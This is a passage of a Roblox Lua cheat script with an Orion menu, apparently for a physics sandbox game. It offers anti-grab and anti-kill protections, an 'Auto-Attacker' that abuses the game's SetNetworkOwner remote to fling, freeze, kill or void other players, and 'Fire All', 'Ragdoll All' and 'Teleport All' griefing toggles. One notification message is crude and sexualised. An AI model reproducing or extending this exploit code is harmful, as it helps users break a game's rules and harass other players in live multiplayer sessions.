    if _G.antiKillEnabled then
        local char = localPlayer.Character
        local humanoid = char and char:FindFirstChild("Humanoid")
        if humanoid and not isWhitelisted(localPlayer.Name) then
            humanoid.HealthChanged:Connect(function(newHealth)
                if newHealth < humanoid.MaxHealth then
                    humanoid.Health = humanoid.MaxHealth
                end
            end)
        end
    end
end

localPlayer.CharacterAdded:Connect(onHealthChanged)
if localPlayer.Character then
    onHealthChanged()
end

local function disableMassless()
    local function updateMassless()
        local character = localPlayer.Character
        if character then
            for _, part in pairs(character:GetChildren()) do
                if part:IsA("BasePart") then
                    part.Massless = false
                end
            end
        end
    end
    
    if not masslessLoop then
        masslessLoop = RunService.Heartbeat:Connect(function()
            updateMassless()
            if not localPlayer.Character or not localPlayer.Character:FindFirstChild("Humanoid") then
                masslessLoop:Disconnect()
                masslessLoop = nil
            end
        end)
    end
    
    updateMassless()
end

local function stopMassless()
    if masslessLoop then
        masslessLoop:Disconnect()
        masslessLoop = nil
    end
end

antiTab:AddToggle({
    Name = "Anti-Grab-Blob",
    Default = false,
    Save = true,
    Flag = "AutoStruggle",
    Callback = function(enabled)
        _G.toggleActiveAntiGrabAndBlobman = enabled
        _G.antiKillEnabled = enabled
        if enabled then
            startAutoStruggle()
            setupSitAndRemoveCreatureBlobman()
            disableMassless()
        else
            if _G.autoStruggleCoroutine then
                _G.autoStruggleCoroutine:Disconnect()
                _G.autoStruggleCoroutine = nil
            end
            disconnectAll()
            stopMonitoringBlobmans()
            stopMassless()  
        end
    end
})

PS64 = game:GetService("Players")
RS64 = game:GetService("ReplicatedStorage")
R64 = game:GetService("RunService")
WS64 = game:GetService("Workspace")
LocalPlayer64 = PS64.LocalPlayer

CHECK_INTERVAL64 = 1
notificationSent64 = false
detectingBlobman = false
masslessLoopActive = false
antiGrabActive = false
protectionsEnabled = false

function sendNotification64()
    if notificationSent64 then return end
    notificationSent64 = true
    local sound64 = Instance.new("Sound", game.SoundService)
    sound64.SoundId = "rbxassetid://117527105076467"
    sound64.Volume = 2
    sound64.Looped = false
    sound64:Play()
    OrionLib:MakeNotification({
        Name = "Anti-Blob Active!",
        Content = "All protections are ON. You are now safe from grabs and blob detectors.",
        Image = "rbxassetid://4483345998",
        Time = 5
    })

    sound64.Ended:Connect(function()
        OrionLib:MakeNotification({
            Name = "Okay...",
            Content = "Who's a good boy! Mommy saved You hehe with anti blobby milky",
            Image = "rbxassetid://4483345998",
            Time = 5
        })
        sound64:Destroy()
    end)
end

function disableExplosions64()
    WS64.DescendantAdded:Connect(function(v64)
        if v64:IsA("Explosion") then
            v64.BlastPressure = 0
        end
    end)
end

function setupAntiGrab64()
    task.spawn(function()
        while antiGrabActive do
            local char64 = LocalPlayer64.Character
            if char64 and char64:FindFirstChild("HumanoidRootPart") then
                local isGrabbedByDetector = false
                for _, player64 in ipairs(PS64:GetPlayers()) do
                    if player64 ~= LocalPlayer64 then
                        local blobmanFolder64 = WS64:FindFirstChild(player64.Name .. "SpawnedInToys")
                        if blobmanFolder64 then
                            for _, blobman64 in ipairs(blobmanFolder64:GetChildren()) do
                                if blobman64.Name == "CreatureBlobman" then
                                    for _, descendant64 in ipairs(blobman64:GetDescendants()) do
                                        if descendant64:IsA("BasePart") and (descendant64.Name == "RightDetector" or descendant64.Name == "LeftDetector") then
                                            if descendant64:FindFirstChild("AttachPlayer") and descendant64.AttachPlayer.Value == LocalPlayer64 then
                                                isGrabbedByDetector = true
                                                break
                                            end
                                        end
                                    end
                                end
                                if isGrabbedByDetector then break end
                            end
                        end
                        if isGrabbedByDetector then break end
                    end
                end

                if isGrabbedByDetector then
                    char64["HumanoidRootPart"].Anchored = true
                    char64["HumanoidRootPart"].AssemblyLinearVelocity = Vector3.new()
                else
                    char64["HumanoidRootPart"].Anchored = false
                end
            end
            task.wait(0.2)
        end
    end)
end

function neutralizeDetectors64(blobman64)
    for _, descendant64 in ipairs(blobman64:GetDescendants()) do
        if descendant64:IsA("BasePart") and (descendant64.Name == "RightDetector" or descendant64.Name == "LeftDetector") then
            if descendant64:FindFirstChild("AttachPlayer") then
                descendant64.AttachPlayer:Destroy()
            end
            descendant64.CanTouch = false
            descendant64.CanCollide = false
        end
    end
end

function detectAndNeutralizeDetectors64()
    task.spawn(function()
        while detectingBlobman do
            for _, player64 in ipairs(PS64:GetPlayers()) do
                if player64 ~= LocalPlayer64 then 
                    local blobmanFolder64 = WS64:FindFirstChild(player64.Name .. "SpawnedInToys")
                    if blobmanFolder64 then
                        for _, blobman64 in ipairs(blobmanFolder64:GetChildren()) do
                            if blobman64.Name == "CreatureBlobman" then
                                neutralizeDetectors64(blobman64)
                            end
                        end
                    end
                end
            end
            local plots64 = { "Plot1", "Plot2", "Plot3", "Plot4", "Plot5" }
            for _, plotName64 in ipairs(plots64) do
                local plot64 = WS64.PlotItems:FindFirstChild(plotName64)
                if plot64 then
                    local blobman64 = plot64:FindFirstChild("CreatureBlobman")
                    if blobman64 then
                        neutralizeDetectors64(blobman64)
                    end
                end
            end
            task.wait(CHECK_INTERVAL64)
        end
    end)
end

function setMassless64()
    task.spawn(function()
        while masslessLoopActive do
            local char64 = LocalPlayer64.Character
            if char64 then
                local parts64 = {
                    char64:FindFirstChild("CamPart"),
                    char64:FindFirstChild("Head"),
                    char64:FindFirstChild("HumanoidRootPart"),
                    char64:FindFirstChild("Left Arm"),
                    char64:FindFirstChild("Left Leg"),
                    char64:FindFirstChild("Right Arm"),
                    char64:FindFirstChild("Right Leg"),
                    char64:FindFirstChild("Torso")
                }
                for _, part64 in ipairs(parts64) do
                    if part64 and part64:IsA("BasePart") then
                        part64.Massless = false
                    end
                end
            end
            task.wait(0.5)
        end
    end)
end

function onCharacterAdded64(char64)
    if protectionsEnabled then
        setupAntiGrab64()
        detectAndNeutralizeDetectors64()
        setMassless64()
    end
end

LocalPlayer64.CharacterAdded:Connect(onCharacterAdded64)
if LocalPlayer64.Character then
    onCharacterAdded64(LocalPlayer64.Character)
end

function activateAllProtections()
    protectionsEnabled = true
    if not notificationSent64 then
        sendNotification64()
    end
    disableExplosions64()
    detectingBlobman = true
    masslessLoopActive = true
    antiGrabActive = true
    setupAntiGrab64()
    detectAndNeutralizeDetectors64()
    setMassless64()
end

function deactivateAllProtections()
    protectionsEnabled = false
    detectingBlobman = false
    masslessLoopActive = false
    antiGrabActive = false
end

antiTab:AddToggle({
    Name = "Anti Blob  Best",
    Default = false,
    Callback = function(Value)
        if Value then
            activateAllProtections()
        else
            deactivateAllProtections()
        end
    end    
})

local player = game.Players.LocalPlayer local character = player.Character or player.CharacterAdded:Wait() local playersInPlots = workspace:FindFirstChild("PlotItems") and workspace.PlotItems:FindFirstChild("PlayersInPlots") local isAntiBananaEnabled = false

local function addPlayerToPlot() while isAntiBananaEnabled do if playersInPlots and not playersInPlots:FindFirstChild(character.Name) then character.Parent = playersInPlots end wait(1) end end

local function eatBanana() while isAntiBananaEnabled do local foundBanana = false

for _, player in ipairs(game.Players:GetPlayers()) do
        local toysFolder = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
        if toysFolder then
            for _, item in ipairs(toysFolder:GetChildren()) do
                if item:IsA("Model") and item.Name == "FoodBanana" then
                    local holdPart = item:FindFirstChild("HoldPart")
                    if holdPart then
                        local holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction")
                        local dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction")
                        if holdRemote and dropRemote then
                            holdRemote:InvokeServer(item, character)
                            dropRemote:InvokeServer(item, CFrame.new(0, -5000, 0), Vector3.new(0, -1000, 0))
                            foundBanana = true
                            break
                        end
                    end
                end
            end
        end
        if foundBanana then break end
    end
    
    local plotItems = workspace:FindFirstChild("PlotItems")
    if not foundBanana and plotItems then
        for i = 1, 5 do
            local plot = plotItems:FindFirstChild("Plot" .. i)
            if plot then
                for _, item in ipairs(plot:GetChildren()) do
                    if item:IsA("Model") and item.Name == "FoodBanana" then
                        local holdPart = item:FindFirstChild("HoldPart")
                        if holdPart then
                            local holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction")
                            local dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction")
                            if holdRemote and dropRemote then
                                holdRemote:InvokeServer(item, character)
                                dropRemote:InvokeServer(item, CFrame.new(0, -5000, 0), Vector3.new(0, -1000, 0))
                                foundBanana = true
                                break
                            end
                        end
                    end
                end
            end
            if foundBanana then break end
        end
    end
    
    task.wait(1)
end

end

antiTab:AddToggle({Name = "Anti Banana v2 (Destroy Then Bananas)", Default = false, Callback = function(value) isAntiBananaEnabled = value if value then spawn(eatBanana) spawn(addPlayerToPlot) end end })



local Section = antiTab:AddSection({
	Name = "Auto Defense"
})

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Debris = game:GetService("Debris")
local localPlayer = Players.LocalPlayer

local GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
local SetNetworkOwner = GrabEvents:WaitForChild("SetNetworkOwner")

local autoAttackActive = false
local selectedAttack = "Fling"
local currentCoroutine

local function stopCoroutine()
    if currentCoroutine then
        coroutine.close(currentCoroutine)
        currentCoroutine = nil
    end
end

local function setNetwork(target)
    if target then
        SetNetworkOwner:FireServer(target, localPlayer.Character.HumanoidRootPart.CFrame)
    end
end

local function freeze(attacker)
    if attacker.Character then
        local target = attacker.Character:FindFirstChild("HumanoidRootPart")
        if target then
            setNetwork(target)
            local bodyVelocity = target:FindFirstChild("FreezeVelocity") or Instance.new("BodyVelocity")
            bodyVelocity.Name = "FreezeVelocity"
            bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bodyVelocity.Velocity = Vector3.new(0, 0, 0)
            bodyVelocity.Parent = target
        end
    end
end

local function fling(attacker)
    if attacker.Character then
        local target = attacker.Character:FindFirstChild("HumanoidRootPart")
        if target then
            setNetwork(target)
            local awayDirection = (target.Position - localPlayer.Character.HumanoidRootPart.Position).Unit
            awayDirection = Vector3.new(awayDirection.X, 0, awayDirection.Z)
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bodyVelocity.Velocity = awayDirection * 9999999999999
            bodyVelocity.Parent = target
            Debris:AddItem(bodyVelocity, 0.1)
        end
    end
end

local function kill(attacker)
    if attacker.Character then
        setNetwork(attacker.Character:FindFirstChild("HumanoidRootPart"))
        attacker.Character:BreakJoints()
        local humanoid = attacker.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Health = 0
        end
    end
end

local function void(attacker)
    if attacker.Character then
        local target = attacker.Character:FindFirstChild("HumanoidRootPart")
        if target then
            setNetwork(target)
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
            bodyVelocity.Velocity = Vector3.new(0, -1000, 0)
            bodyVelocity.Parent = target
            Debris:AddItem(bodyVelocity, 100)
            target.CFrame = CFrame.new(Vector3.new(0, -1000, 0))
        end
    end
end

local function spy(attacker)
    if attacker.Character then
        local target = attacker.Character:FindFirstChild("HumanoidRootPart")
        if target then
            setNetwork(target)
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bodyVelocity.Velocity = Vector3.new(0, 100, 0)
            bodyVelocity.Parent = target
            Debris:AddItem(bodyVelocity, 0.1)
        end
    end
end

local function autoAttackLoop()
    stopCoroutine()
    currentCoroutine = coroutine.create(function()
        while autoAttackActive do
            local character = localPlayer.Character
            if character and character:FindFirstChild("Head") then
                local partOwner = character.Head:FindFirstChild("PartOwner")
                if partOwner then
                    local attacker = Players:FindFirstChild(partOwner.Value)
                    if attacker then
                        if selectedAttack == "Freeze" then
                            freeze(attacker)
                        elseif selectedAttack == "Fling" then
                            fling(attacker)
                        elseif selectedAttack == "Kill" then
                            kill(attacker)
                        elseif selectedAttack == "Void" then
                            void(attacker)
                        elseif selectedAttack == "Spy" then
                            spy(attacker)
                        end
                    end
                end
            end
            wait(0.02)
        end
    end)
    coroutine.resume(currentCoroutine)
end

local function onDeath()
    if autoAttackActive then
        wait(3)
        autoAttackLoop()
    end
end

local function onSpawn(character)
    character:WaitForChild("Humanoid").Died:Connect(onDeath)
end

if localPlayer.Character then
    onSpawn(localPlayer.Character)
end

localPlayer.CharacterAdded:Connect(onSpawn)

antiTab:AddDropdown({
    Name = "Auto-Attack (Type)",
    Default = "Fling",
    Options = {"Freeze", "Fling", "Death", "Void", "Spy"},
    Callback = function(Value)
        selectedAttack = Value
        if autoAttackActive then
            autoAttackLoop()
        end
    end
})

antiTab:AddToggle({
    Name = "Auto-Attacker",
    Color = Color3.fromRGB(240, 0, 0),
    Default = false,
    Save = true,
    Flag = "AutoAttackEnabled",
    Callback = function(enabled)
        autoAttackActive = enabled
        if enabled then
            autoAttackLoop()
        else
            stopCoroutine()
        end
    end
})


local MiscTab = Window:MakeTab({
    Name = "Misc",
	Icon = "rbxassetid://7734058894",
    PremiumOnly = false
})


MiscTab:AddSection({
    Name = "Fire and Ragdoll People"
})

MiscTab:AddToggle({
    Name = "Fire All",
    Default = false,
    Save = true,
    Callback = function(enabled)
        if enabled then
            fireAllCoroutine = coroutine.create(fireAll)
            coroutine.resume(fireAllCoroutine)
        else
            if fireAllCoroutine then
                coroutine.close(fireAllCoroutine)
                fireAllCoroutine = nil
            end
        end
    end
})


MiscTab:AddToggle({
    Name = "Ragdoll All",
    Default = false,
    Save = true,
    Callback = function(enabled)
        if enabled then
            ragdollAllCoroutine = coroutine.create(ragdollAll)
            coroutine.resume(ragdollAllCoroutine)
        else
            if ragdollAllCoroutine then
                coroutine.close(ragdollAllCoroutine)
                ragdollAllCoroutine = nil
            end
        end
    end
})


local Section = MiscTab:AddSection({
	Name = "Bring All"
})



MiscTab:AddButton({
    Name = "Set Teleport Position",
    Callback = function()
        teleportPosition = localPlayer.Character.HumanoidRootPart.Position 
        print("Teleport position set to:", teleportPosition)
    end    
})

MiscTab:AddSlider({
    Name = "Teleport speed",
    Min = 0,
    Max = 4,
    Default = 0.5,
    Increment = 0.1,
    ValueName = "segundos",
    Callback = function(Value)
        teleportDelay = Value
        print("Wait time set for: " .. Value .. " segundos")
    end    
})

MiscTab:AddToggle({
    Name = "Enable To Teleport All",
    Default = false,
    Callback = function(Value)
        teleportActive = Value
        if teleportActive then
            saveOriginalPosition()
            print("Teleport All Players activated!")
            while teleportActive do
                teleportToAllPlayers()
                wait(2)
            end
        else
            restoreOriginalPosition()
            print("Teleport All Players disabled!")
            teleport(teleportPosition)
        end
    end    
})








OrionLib:Init()

